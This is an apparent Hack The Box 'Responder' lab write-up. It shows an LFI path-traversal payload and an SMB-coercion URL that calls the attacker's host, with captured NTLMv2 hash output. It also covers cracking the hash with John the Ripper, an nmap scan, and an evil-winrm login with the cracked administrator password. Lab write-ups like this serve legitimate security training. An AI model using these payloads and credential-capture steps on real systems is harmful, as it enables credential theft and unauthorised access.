# Responder
Target Machine IP = 10.129.185.212

# Solution
1. add `unika.htb` to `/etc/host` with the ip, unika.htb
2. view page source and we can see many reference to index.php, php
3. the url param when changing lang, page
4. here we can see LFI from page, ../../../../../../../../windows/system32/drivers/etc/hosts
5. here we can see RFI from pagem, //10.10.14.6/somefile
6. new technology lan manager
7. -I
8. john the ripper
9. run responder.py and do LFI using previous exploit, badminton
![image](https://github.com/ilhamhanifan/hackerman/assets/53177896/5777d9f2-2d65-4125-a008-b10430bf9189)
Do LFI http://unika.htb/?page=//10.10.14.25/somefile
![image](https://github.com/ilhamhanifan/hackerman/assets/53177896/6cae6e4b-b99a-420c-94d2-5bbb3c36e77b)
heres the responder output
```bash
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.233.241
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:e42c3746f14557b6:1505E56813DF9B7A4B6924199699CACE:01010000000000000006CB307094D9012DCA1AA643110F920000000002000800520047003100380001001E00570049004E002D003500590037004A004B005300420058004F003500590004003400570049004E002D003500590037004A004B005300420058004F00350059002E0052004700310038002E004C004F00430041004C000300140052004700310038002E004C004F00430041004C000500140052004700310038002E004C004F00430041004C00070008000006CB307094D901060004000200000008003000300000000000000001000000002000006E344009635A59B16853461063A11930A9DAA6F30C5AAD3B8D778EF23B30160E0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00360031000000000000000000
```
run JTR to the NTLM hash
![image](https://github.com/ilhamhanifan/hackerman/assets/53177896/c8fbe587-ff96-407c-b0f2-2ca9db7e96a5)

10. nmap scan results, 5985
```bash
┌──(vagrant㉿kali-linux)-[~/responder]
└─$ sudo nmap -p- -sV -T5 unika.htb
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 10:10 EDT
Stats: 0:03:17 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 60.06% done; ETC: 10:15 (0:02:10 remaining)
Stats: 0:04:15 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 76.86% done; ETC: 10:15 (0:01:16 remaining)
Nmap scan report for unika.htb (10.129.233.241)
Host is up (0.27s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.52 (OpenSSL/1.1.1m PHP/8.1.1)
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 396.41 seconds

┌──(vagrant㉿kali-linux)-[~/responder]
└─$
```

11. somehow i cant use evil-rm, unfinished
```
evil-winrm -i 10.129.233.241 -u administrator -p badminton
```

flag = xxxxxxxxxxxxx
